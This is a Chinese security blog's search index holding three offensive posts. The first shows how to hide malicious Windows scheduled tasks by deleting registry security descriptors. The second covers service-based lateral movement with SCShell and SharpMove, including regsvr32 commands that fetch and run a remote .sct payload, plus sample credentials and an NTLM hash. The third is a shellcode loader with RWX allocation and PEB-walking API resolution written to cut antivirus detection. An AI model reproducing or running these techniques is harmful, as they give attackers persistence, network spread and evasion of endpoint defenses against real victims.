<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Windows下任务计划隐藏方式</title>
    <url>/2021/03/04/Windows%E4%B8%8B%E4%BB%BB%E5%8A%A1%E8%AE%A1%E5%88%92%E9%9A%90%E8%97%8F%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<img src="https://ad05nemy.github.io/2019/04/11/shellcode-2/zhaiyao.jpeg" width="100%">
<span id="more"></span>
------------------------------------


<h3 id="作者：REInject-73lab-青藤实验室"><a href="#作者：REInject-73lab-青藤实验室" class="headerlink" title="作者：REInject@73lab@青藤实验室"></a>作者：REInject@73lab@青藤实验室</h3><p>原文链接：<a href="https://mp.weixin.qq.com/s/ktGug1VbSpmzh9CEGKbbdw">https://mp.weixin.qq.com/s/ktGug1VbSpmzh9CEGKbbdw</a></p>
<h4 id="计划任务的创建方式"><a href="#计划任务的创建方式" class="headerlink" title="计划任务的创建方式"></a>计划任务的创建方式</h4><p><strong>命令行创建计划</strong>任务包括 at.exe 和 schtasks.exe<br><strong>at.exe</strong><br>使用 at 命令创建计划任务的方式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">at <span class="number">11</span>:<span class="number">11</span> /every:Sunday,Monday,Tue**sday <span class="string">&quot;malware.exe&quot;</span></span><br></pre></td></tr></table></figure>
<p>以上命令将创建一个计划任务，在每周日、周一、周二的 11:11 执行 malware.exe<br><strong>schtasks.exe</strong><br>at.exe 在 windows8 开始就弃用了，之后的系统都是使用 schtasks.exe 创建计划任务，该命令参数信息请自行百度或者HELP查看<br>例:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;c:\Windows\System32\schtasks.exe&quot;</span> /Create /SC ONCE /TN test /TR <span class="string">&quot;cmd /c \&quot;start /min C:\ProgramData\shell.exe\&quot;&quot;</span> /ST <span class="number">20</span>:<span class="number">21</span></span><br></pre></td></tr></table></figure>
<p>这个命令中使用了 /TN 指定任务名称为 test，/TR 参数指定运行的恶意命令，/ST 指定了运行时间，/SC 指定运行周期，还可以通过 /ED 参数指定任务终止日期等</p>
<p>一旦任务创建，将会自动在目录 %SystemRoot%\System32\Tasks 生成一个关于该任务的描述性 XML 文件，包含了所有的任务信息</p>
<p><strong>图形界面创建计划任务</strong><br>win+r启动taskschd.msc<br><img src="/2021/03/04/Windows%E4%B8%8B%E4%BB%BB%E5%8A%A1%E8%AE%A1%E5%88%92%E9%9A%90%E8%97%8F%E6%96%B9%E5%BC%8F/../../../../photo/taskschd.msc.jpg" alt="Alt text"><br>需要注意的是，通过 taskschd.msc 创建的任务会直接从托管 Task Scheduler 服务的 svchost.exe 进程派生</p>
<p><strong>代码创建计划任务</strong><br>代码最终都是和</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">c:\windows\system32\taskschd.dll</span><br></pre></td></tr></table></figure>
<p>提供的 COM 服务交互，它的 GUID 是 0F87369F-A4E5-4CFC-BD3E-73E6154572DD</p>
<h3 id="深入理解计划任务"><a href="#深入理解计划任务" class="headerlink" title="深入理解计划任务"></a>深入理解计划任务</h3><h4 id="计划任务的父进程"><a href="#计划任务的父进程" class="headerlink" title="计划任务的父进程"></a>计划任务的父进程</h4><p>运行计划任务的相关服务是：Task Scheduler。该服务使用 svchost.exe 的 netsvcs 组进行托管<br><img src="/2021/03/04/Windows%E4%B8%8B%E4%BB%BB%E5%8A%A1%E8%AE%A1%E5%88%92%E9%9A%90%E8%97%8F%E6%96%B9%E5%BC%8F/../../../../photo/services.jpg" alt="Alt text"></p>
<h4 id="计划任务相关注册表项"><a href="#计划任务相关注册表项" class="headerlink" title="计划任务相关注册表项"></a>计划任务相关注册表项</h4><p>在 XP 时，计划任务注册表路径为</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\S</span>chedulingAgent</span><br></pre></td></tr></table></figure>
<p>Win7 以后发生变化，变成</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\S</span>chedule</span><br></pre></td></tr></table></figure>
<p>子项有：<br><img src="/2021/03/04/Windows%E4%B8%8B%E4%BB%BB%E5%8A%A1%E8%AE%A1%E5%88%92%E9%9A%90%E8%97%8F%E6%96%B9%E5%BC%8F/../../../../photo/zixiang.jpg" alt="Alt text"><br>任务项信息除了在磁盘中的 %SystemRoot%\System32\Tasks 下之外，还在下面的注册表项中存在：</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\S</span>chedule<span class="symbol">\T</span>askCache</span><br></pre></td></tr></table></figure>
<p>Schedule\TaskCache子项 :<br><img src="/2021/03/04/Windows%E4%B8%8B%E4%BB%BB%E5%8A%A1%E8%AE%A1%E5%88%92%E9%9A%90%E8%97%8F%E6%96%B9%E5%BC%8F/../../../../photo/zixiang2.jpg" alt="Alt text"><br>Tree 子项以任务名称命名，每个任务下的 Value 结构如下：<br><img src="/2021/03/04/Windows%E4%B8%8B%E4%BB%BB%E5%8A%A1%E8%AE%A1%E5%88%92%E9%9A%90%E8%97%8F%E6%96%B9%E5%BC%8F/../../../../photo/zixiang3.jpg" alt="Alt text"><br>每个 Schedule\TaskCache\Tasks%GUID% 对应一个任务，有这些 Value :<br><img src="/2021/03/04/Windows%E4%B8%8B%E4%BB%BB%E5%8A%A1%E8%AE%A1%E5%88%92%E9%9A%90%E8%97%8F%E6%96%B9%E5%BC%8F/../../../../photo/value.jpg" alt="Alt text"></p>
<h4 id="计划任务的安全描述符（SD）"><a href="#计划任务的安全描述符（SD）" class="headerlink" title="计划任务的安全描述符（SD）####"></a>计划任务的安全描述符（SD）####</h4><p>计划任务的 SD 配置在注册表中的位置：</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\S</span>chedule<span class="symbol">\T</span>askCache<span class="symbol">\T</span>ree<span class="symbol">\&#123;</span>TaskName&#125;<span class="symbol">\S</span>D</span><br></pre></td></tr></table></figure>
<h4 id="SD的作用"><a href="#SD的作用" class="headerlink" title="SD的作用"></a>SD的作用</h4><p>经过进程监控，发现在计划任务信息查询过程中的流程如下：</p>
<p>查询 </p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">HKLM<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\S</span>chedule<span class="symbol">\T</span>askCache<span class="symbol">\T</span>ree<span class="symbol">\S</span>D</span><br></pre></td></tr></table></figure>
<p>查的到继续，查不到则终止查询<br>遍历查询 </p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">HKLM<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\S</span>chedule<span class="symbol">\T</span>askCache<span class="symbol">\T</span>ree<span class="symbol">\&#123;</span>TaskName&#125; </span><br></pre></td></tr></table></figure>
<p>中的 Id、Index、SD等值<br>查询到的 SD 值，会对之后是否有权限查看该任务信息有影响，查不查的到和这个值息息相关<br>根据 SD 值，进行权限检查<br>如果权限通过，格式化输出 </p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">HKLM<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\S</span>chedule<span class="symbol">\T</span>askCache<span class="symbol">\T</span>asks<span class="symbol">\&#123;</span>TaskId&#125;</span><br></pre></td></tr></table></figure>
<p>中的任务详细信息<br>权限不通过，则进行下一个任务的查询<br>正常任务查询：<br><img src="/2021/03/04/Windows%E4%B8%8B%E4%BB%BB%E5%8A%A1%E8%AE%A1%E5%88%92%E9%9A%90%E8%97%8F%E6%96%B9%E5%BC%8F/../../../../photo/procmon.jpg" alt="Alt text"><br>删除 SD 后的任务查询：<br><img src="/2021/03/04/Windows%E4%B8%8B%E4%BB%BB%E5%8A%A1%E8%AE%A1%E5%88%92%E9%9A%90%E8%97%8F%E6%96%B9%E5%BC%8F/../../../../photo/procmonSD.jpg" alt="Alt text"><br>可见，因为找不到任务的 SD 信息，无法确定用户是否有权限查看该任务信息，导致系统直接判定无权限查看:<br><img src="/2021/03/04/Windows%E4%B8%8B%E4%BB%BB%E5%8A%A1%E8%AE%A1%E5%88%92%E9%9A%90%E8%97%8F%E6%96%B9%E5%BC%8F/../../../../photo/notfound.jpg" alt="Alt text"></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>创建计划任务后会在磁盘中的 %SystemRoot%\System32\Tasks 下生成任务项信息，同时会在注册表</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\S</span>chedule<span class="symbol">\T</span>askCache<span class="symbol">\T</span>ree\</span><br></pre></td></tr></table></figure>
<p>下创建同名任务项</p>
<h4 id="非完全隐藏"><a href="#非完全隐藏" class="headerlink" title="非完全隐藏"></a>非完全隐藏</h4><p>如果想要隐藏一个计划任务，可以通过修改 Schedule\TaskCache\Tree 中对应任务的 SD 值</p>
<p>修改</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\S</span>chedule<span class="symbol">\T</span>askCache<span class="symbol">\T</span>ree</span><br></pre></td></tr></table></figure>
<p>下对应任务的 Index 值为 0或直接删除SD值<br>删除 %SystemRoot%\System32\Tasks 下任务对应的 XML 文件<br>优点： - 利用 taskschd.msc、schtasks 甚至系统API查询出的所有任务中，都看不到该任务</p>
<p>缺点： - 如果是修改index值,并非完全隐藏，如果知道该任务的名字，可以通过 schtasks /query /tn {TaskName} 查到,如果是直接删除SD项，除了能在注册表项下看到该计划任务名字，其余方法均无法查到 - 无论是低权的任务还是高权，都需要 SYSTEM 权限</p>
<h4 id="完全隐藏"><a href="#完全隐藏" class="headerlink" title="完全隐藏"></a>完全隐藏</h4><p>以上内容均来源于青藤云文章本地测试所得，在测试过程中，发现直接删除注册表</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\S</span>chedule<span class="symbol">\T</span>askCache<span class="symbol">\T</span>ree\</span><br></pre></td></tr></table></figure>
<p>下的对应任务项，计划任务仍在运行，由此实现完全隐藏，但重启之后计划任务就会失效，且无法删除</p>
]]></content>
      <tags>
        <tag>Windows</tag>
        <tag>后渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>基于服务的横向渗透学习</title>
    <url>/2021/03/08/%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<img src="https://ad05nemy.github.io/2019/04/12/shellcode-4/zhaiyao.jpeg" width="100%">
<span id="more"></span>

<p>前几天在pentestlab学习了一个新的想法，想着就打算写篇文章加深一下<br>###原文链接:<a href="https://pentestlab.blog/2020/07/21/lateral-movement-services">https://pentestlab.blog/2020/07/21/lateral-movement-services</a> ###</p>
<h2 id="基于服务的横向渗透"><a href="#基于服务的横向渗透" class="headerlink" title="基于服务的横向渗透"></a>基于服务的横向渗透</h2><p><strong>PSEXEC</strong><br>原理:</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>利用ADMIN$共享放<span class="module-access"><span class="module"><span class="identifier">Psexesvc</span>.</span></span>exe至远程主机</span><br><span class="line"><span class="number">2.</span>通过服务管理SCManager远程创建psexecsvc服务，并启动服务</span><br><span class="line"><span class="number">3.</span>客户端连接执行命令，服务端启动相应的程序并执行回显数据</span><br></pre></td></tr></table></figure>
<p>注:</p>
<ol>
<li>PSEXESVC服务将会安装在远程系统中，此时将会生成Event 4697和Event 7045这两种事件日志。需要注意的是，Event 4697日志记录将有可能包含账号信息。</li>
<li>程序Psexesvc.exe会提取到windows目录下</li>
<li>安装服务会留下明显的日志，而且服务没有删除的风险更大，管理员很容易就会发现</li>
</ol>
<p>个人水平有限，除了psexec暂时没了解到其它的基于服务的手段(当然你也可以手动连接上传文件创建服务）</p>
<p><strong>SCSHELL</strong><br>国外大牛MrUn1k0d3r在工具中用了一种新的方法,利用OpenSCManager API对现有服务的二进制文件进行直接修改,并且可以配合regsvr32使文件不落地</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">SCShell.exe 10.0.0.11 XblAuthManager &quot;C:<span class="symbol">\w</span>indows<span class="symbol">\s</span>ystem32<span class="symbol">\c</span>md.exe /c C:<span class="symbol">\w</span>indows<span class="symbol">\s</span>ystem32<span class="symbol">\r</span>egsvr32.exe /s /n /u /i:http://10.0.0.21:8080/p</span><br><span class="line">entestlab.sct scrobj.dll&quot; . pentestlab Password123</span><br></pre></td></tr></table></figure>
<p><img src="/2021/03/08/%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/../../../../photo/lateral-movement-scshell.png" alt="Alt text"></p>
<p><img src="/2021/03/08/%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/../../../../photo/lateral-movement-scshell-meterpreter.png" alt="Alt text"></p>
<p>工具里配套了python版本的工具,python版使用了DCERPC来认证，不是SMB，这样就可以在非域的机器上使用(配合代理使用)</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python3</span> scshell.py pentestlaboratories/pentestlab@<span class="number">10.0.0.11</span> -hashes aad<span class="number">3</span>b<span class="number">435</span>b<span class="number">51404</span>eeaad<span class="number">3</span>b<span class="number">435</span>b<span class="number">51404</span>ee:<span class="number">58</span>a<span class="number">478135</span>a<span class="number">93</span>ac<span class="number">3</span>bf<span class="number">058</span>a<span class="number">5</span>ea<span class="number">0</span>e<span class="number">8</span>fdb<span class="number">71</span></span><br><span class="line"><span class="attribute">C</span>:\windows\system<span class="number">32</span>\cmd.exe /c C:\windows\system<span class="number">32</span>\regsvr<span class="number">32</span>.exe /s /n /u /i:http://<span class="number">10.0.0.21:8080</span>/pentestlab.sct scrobj.dll</span><br></pre></td></tr></table></figure>
<p><img src="/2021/03/08/%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/../../../../photo/lateral-movement-scshell-python.png" alt="Alt text"></p>
<p>另一种方法是利用WMI来利用(SharpMOVE)</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">SharpMove.exe <span class="attribute">action</span>=modsvc <span class="attribute">computername</span>=PC1 <span class="attribute">command</span>=<span class="string">&quot;cmd.exe /c \\10.0.0.21\pentestlab\pentestlab.exe&quot;</span> <span class="attribute">amsi</span>=<span class="literal">true</span> <span class="attribute">servicename</span>=pentestlab <span class="attribute">username</span>=pentestlab <span class="attribute">password</span>=Password123</span><br></pre></td></tr></table></figure>
<p><img src="/2021/03/08/%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/../../../../photo/lateral-movement-sharpmove.png" alt="Alt text"><br><img src="/2021/03/08/%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/../../../../photo/lateral-movement-sharpmove-meterpreter.png" alt="Alt text"><br>工具地址:<a href="https://github.com/Mr-Un1k0d3r/SCShell">https://github.com/Mr-Un1k0d3r/SCShell</a><br><a href="https://github.com/0xthirteen/SharpMove">https://github.com/0xthirteen/SharpMove</a><br>(本人只是搬运工）</p>
]]></content>
      <tags>
        <tag>Windows</tag>
        <tag>后渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Shellcode加载器</title>
    <url>/2021/12/29/Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/</url>
    <content><![CDATA[<img src="https://ad05nemy.github.io/2019/04/12/shellcode-6/zhaiyao.jpeg" width="100%">
<span id="more"></span>

<h4 id="ShellCode加载"><a href="#ShellCode加载" class="headerlink" title="ShellCode加载"></a>ShellCode加载</h4><p>目前杀软一般通过行为特征，字符串等进行动态查杀shellcode，EDR则会通过HOOK系统函数来判断恶意程序，这是EDR和AV核心不同的点。</p>
<p><strong>EDRhook函数是在用户态(ring3)，方式是劫持/修改系统dll函数定义，如(kernel32.dll)，通过在函数开头插入jmp指令，跳转到EDR得判断函数来进行监测</strong><br><img src="/2021/12/29/Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/../../../../photo/shellcodeloader/edrhook.jpg" alt="edrhook"><br><strong>还有一种方式是通过在系统加载的程序之后插入EDR本身进行监测的dll，这样程序加载如(GetProcessHandle)等函数即可被检测到</strong><br><img src="/2021/12/29/Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/../../../../photo/shellcodeloader/edrdll.jpg" alt="edrhook"></p>
<p>例:一个简单的线程加载shellcode</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">##include &lt;Windows.h&gt;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> shellcode[] = <span class="string">&quot;\xfc\xe8\x82 (...) &quot;</span>;</span><br><span class="line">	PVOID shellcode_exec = VirtualAlloc(<span class="number">0</span>, sizeof shellcode, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	memcpy(shellcode_exec, shellcode, sizeof shellcode);</span><br><span class="line">	DWORD threadID;</span><br><span class="line">	HANDLE hThread = CreateThread(NULL, <span class="number">0</span>, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, <span class="number">0</span>, &amp;threadID);</span><br><span class="line">	WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译之后在VT查杀一下<br><img src="/2021/12/29/Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/../../../../photo/shellcodeloader/vt1.jpg" alt="edrhook"><br>26/67的查杀率很高，因为我们是原生的函数</p>
<h4 id="动态加载函数"><a href="#动态加载函数" class="headerlink" title="动态加载函数"></a>动态加载函数</h4><p>加载shellcode用的<strong>VirtualAlloc</strong>以及<strong>CreateThread</strong>等函数，基本存在于一个系统dll<strong>kernel32.dll</strong>中，动态加载kernel32.dll，利用PEB/TEB结构即可遍历到kernelbase的地址</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">_declspec(naked) <span class="function">DWORD <span class="title">getKernel32</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	_asm</span><br><span class="line">	&#123;</span><br><span class="line">		mov eax, fs:[030h]</span><br><span class="line">		mov eax, [eax+0ch]</span><br><span class="line">		mov eax, [eax+14h]</span><br><span class="line">		mov eax, [eax]</span><br><span class="line">		mov eax, [eax]</span><br><span class="line">		mov eax, [eax+10h]</span><br><span class="line">		ret</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>注意:内联汇编只能用于x86架构</strong><br>使用C++亦可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PPEB pPEB = (PPEB)__readgsqword(<span class="number">0x60</span>);</span><br><span class="line">PPEB_LDR_DATA pLoaderData = pPEB-&gt;Ldr;</span><br><span class="line">PLIST_ENTRY listHead = &amp;pLoaderData-&gt;InMemoryOrderModuleList;</span><br><span class="line">PLIST_ENTRY listCurrent = listHead-&gt;Flink;</span><br><span class="line">PVOID kernel32Address;</span><br><span class="line">PVOID pvDllMemory = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">	PLDR_DATA_TABLE_ENTRY dllEntry = CONTAINING_RECORD(listCurrent, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);</span><br><span class="line">	DWORD dllNameLength = WideCharToMultiByte(CP_ACP, <span class="number">0</span>, dllEntry-&gt;FullDllName.Buffer, dllEntry-&gt;FullDllName.Length, NULL, <span class="number">0</span>, NULL, NULL);</span><br><span class="line">	PCHAR dllName = (PCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllNameLength);</span><br><span class="line">	WideCharToMultiByte(CP_ACP, <span class="number">0</span>, dllEntry-&gt;FullDllName.Buffer, dllEntry-&gt;FullDllName.Length, dllName, dllNameLength, NULL, NULL);</span><br><span class="line">	CharUpperA(dllName);</span><br><span class="line">	<span class="keyword">if</span> (strstr(dllName, <span class="string">&quot;KERNEL32.DLL&quot;</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		kernel32Address = dllEntry-&gt;DllBase;</span><br><span class="line">		HeapFree(GetProcessHeap(), <span class="number">0</span>, dllName);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	HeapFree(GetProcessHeap(), <span class="number">0</span>, dllName);</span><br><span class="line">	listCurrent = listCurrent-&gt;Flink;</span><br><span class="line">&#125; <span class="keyword">while</span> (listCurrent != listHead);</span><br></pre></td></tr></table></figure>

<p>通过得到的kernel32.dll地址，利用GetProcAddress即可获取函数地址</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;winternl.h&gt;</span><br><span class="line"></span><br><span class="line"><span class="function">typedef <span class="title">HMODULE</span><span class="params">(WINAPI* PGetModuleHandleA)</span><span class="params">(PCSTR)</span></span>;</span><br><span class="line"><span class="function">typedef <span class="title">FARPROC</span><span class="params">(WINAPI* PGetProcAddress)</span><span class="params">(HMODULE, PCSTR)</span></span>;</span><br><span class="line"><span class="function">typedef <span class="title">LPVOID</span><span class="params">(WINAPI* PVirtualAlloc)</span><span class="params">(LPVOID, SIZE_T, DWORD, DWORD)</span></span>;</span><br><span class="line"><span class="function">typedef <span class="title">HANDLE</span><span class="params">(WINAPI* PCreateThread)</span><span class="params">(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD)</span></span>;</span><br><span class="line"><span class="function">typedef <span class="title">DWORD</span><span class="params">(WINAPI* PWaitForSingleObject)</span><span class="params">(HANDLE, DWORD)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PPEB pPEB = (PPEB)__readgsqword(<span class="number">0x60</span>);</span><br><span class="line">	PPEB_LDR_DATA pLoaderData = pPEB-&gt;Ldr;</span><br><span class="line">	PLIST_ENTRY listHead = &amp;pLoaderData-&gt;InMemoryOrderModuleList;</span><br><span class="line">	PLIST_ENTRY listCurrent = listHead-&gt;Flink;</span><br><span class="line">	PVOID kernel32Address;</span><br><span class="line">	PVOID pvDllMemory = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		PLDR_DATA_TABLE_ENTRY dllEntry = CONTAINING_RECORD(listCurrent, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);</span><br><span class="line">		DWORD dllNameLength = WideCharToMultiByte(CP_ACP, <span class="number">0</span>, dllEntry-&gt;FullDllName.Buffer, dllEntry-&gt;FullDllName.Length, NULL, <span class="number">0</span>, NULL, NULL);</span><br><span class="line">		PCHAR dllName = (PCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllNameLength);</span><br><span class="line">		WideCharToMultiByte(CP_ACP, <span class="number">0</span>, dllEntry-&gt;FullDllName.Buffer, dllEntry-&gt;FullDllName.Length, dllName, dllNameLength, NULL, NULL);</span><br><span class="line">		CharUpperA(dllName);</span><br><span class="line">		<span class="keyword">if</span> (strstr(dllName, <span class="string">&quot;KERNEL32.DLL&quot;</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			kernel32Address = dllEntry-&gt;DllBase;</span><br><span class="line">			HeapFree(GetProcessHeap(), <span class="number">0</span>, dllName);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		HeapFree(GetProcessHeap(), <span class="number">0</span>, dllName);</span><br><span class="line">		listCurrent = listCurrent-&gt;Flink;</span><br><span class="line">	&#125; <span class="keyword">while</span> (listCurrent != listHead);</span><br><span class="line"></span><br><span class="line">	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)kernel32Address;</span><br><span class="line">	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)kernel32Address + pDosHeader-&gt;e_lfanew);</span><br><span class="line">	PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER) &amp; (pNtHeader-&gt;OptionalHeader);</span><br><span class="line">	PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)kernel32Address + pOptionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);</span><br><span class="line">	PULONG pAddressOfFunctions = (PULONG)((PBYTE)kernel32Address + pExportDirectory-&gt;AddressOfFunctions);</span><br><span class="line">	PULONG pAddressOfNames = (PULONG)((PBYTE)kernel32Address + pExportDirectory-&gt;AddressOfNames);</span><br><span class="line">	PUSHORT pAddressOfNameOrdinals = (PUSHORT)((PBYTE)kernel32Address + pExportDirectory-&gt;AddressOfNameOrdinals);</span><br><span class="line"></span><br><span class="line">	PGetModuleHandleA pGetModuleHandleA = NULL;</span><br><span class="line">	PGetProcAddress pGetProcAddress = NULL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; pExportDirectory-&gt;NumberOfNames; ++i)</span><br><span class="line">	&#123;</span><br><span class="line">		PCSTR pFunctionName = (PSTR)((PBYTE)kernel32Address + pAddressOfNames[i]);</span><br><span class="line">		<span class="keyword">if</span> (!strcmp(pFunctionName, <span class="string">&quot;GetModuleHandleA&quot;</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			pGetModuleHandleA = (PGetModuleHandleA)((PBYTE)kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (!strcmp(pFunctionName, <span class="string">&quot;GetProcAddress&quot;</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			pGetProcAddress = (PGetProcAddress)((PBYTE)kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	PVirtualAlloc funcVirtualAlloc = (PVirtualAlloc)pGetProcAddress((HMODULE)kernel32Address, <span class="string">&quot;VirtualAlloc&quot;</span>);</span><br><span class="line">	PCreateThread funcCreateThread = (PCreateThread)pGetProcAddress((HMODULE)kernel32Address, <span class="string">&quot;CreateThread&quot;</span>);</span><br><span class="line">	PWaitForSingleObject funcWaitForSingleObject = (PWaitForSingleObject)pGetProcAddress((HMODULE)kernel32Address, <span class="string">&quot;WaitForSingleObject&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> shellcode[] = <span class="string">&quot;\xfc\x48\....&quot;</span>;</span><br><span class="line">	PVOID shellcode_exec = funcVirtualAlloc(<span class="number">0</span>, sizeof shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	memcpy(shellcode_exec, shellcode, sizeof shellcode);</span><br><span class="line">	DWORD threadID;</span><br><span class="line">	HANDLE hThread = funcCreateThread(NULL, <span class="number">0</span>, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, <span class="number">0</span>, &amp;threadID);</span><br><span class="line">	funcWaitForSingleObject(hThread, INFINITE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译测试<br><img src="/2021/12/29/Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/../../../../photo/shellcodeloader/vt2.jpg" alt="edrhook"><br>减少了将近一半,但这还不够</p>
